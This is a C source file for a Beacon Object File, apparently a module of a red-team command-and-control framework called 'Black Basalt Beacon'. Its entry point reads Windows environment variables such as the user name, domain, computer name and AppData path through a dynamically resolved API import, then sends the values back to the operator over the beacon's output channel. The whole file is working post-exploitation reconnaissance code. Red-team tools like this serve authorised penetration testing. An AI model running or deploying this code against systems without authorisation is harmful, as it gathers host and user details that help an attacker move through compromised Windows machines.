
/*
	This file is part of Black Basalt Beacon.

	Black Basalt Beacon is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Black Basalt Beacon is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with Black Basalt Beacon.  If not, see <https://www.gnu.org/licenses/>.

	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
*/
#include <windows.h>
#include "beacon.h"

extern PVOID __imp_GetEnvironmentVariableA;

void go(char *args, int alen) {
    char* vars[] = {
        "USERNAME",
        "USERDOMAIN",
        "COMPUTERNAME",
        "APPDATA",
        "TEMP",
        "SYSTEMROOT",
        "PROGRAMFILES",
        NULL
    };

    for (int i = 0; vars[i] != NULL; i++) {
        char value[1024];
        DWORD result = ((DWORD(WINAPI*)(LPCSTR, LPSTR, DWORD))__imp_GetEnvironmentVariableA)(vars[i], value, sizeof(value));

        if (result == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] %-15s = [NO DISPONIBLE]\n", vars[i]);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] %-15s = %s\n", vars[i], value);
        }
    }
}
